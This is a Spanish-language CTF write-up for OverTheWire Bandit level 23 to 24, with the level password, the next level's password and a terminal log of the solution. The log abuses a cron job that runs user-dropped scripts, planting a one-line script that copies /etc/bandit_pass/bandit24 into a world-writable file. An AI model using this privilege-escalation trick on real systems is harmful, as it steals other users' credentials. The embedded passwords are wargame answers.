# Level 23 -24
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
```bash
Usuario: bandit23
Contraseña:QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
## Solución
```bash
Pass siguiente lvl: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

----------------------------------------
bandit23@bandit:~$
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/kd
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls -la
total 10564
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 14:07 .
drwxrwx-wt 1226 root     root     10801152 Sep 18 14:07 ..
-rw-rw-rw-    1 bandit23 bandit23        0 Sep 18 14:07 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 18 14:07 script.sh
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 10564
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 14:07 .
drwxrwx-wt 1226 root     root     10801152 Sep 18 14:08 ..
-rw-rw-rw-    1 bandit23 bandit23        0 Sep 18 14:07 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 18 14:07 script.sh
bandit23@bandit:/tmp/kd$ date
Mon Sep 18 02:08:15 PM UTC 2023
bandit23@bandit:/tmp/kd$ ls -la
total 10564
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 14:07 .
drwxrwx-wt 1225 root     root     10801152 Sep 18 14:08 ..
-rw-rw-rw-    1 bandit23 bandit23        0 Sep 18 14:07 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 18 14:07 script.sh
bandit23@bandit:/tmp/kd$ cat password
bandit23@bandit:/tmp/kd$ date
Mon Sep 18 02:10:02 PM UTC 2023
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/kd$
```
## Notas Adicionales

| Comando  | Descripción | 
|------------|--------------|

## Referencias 
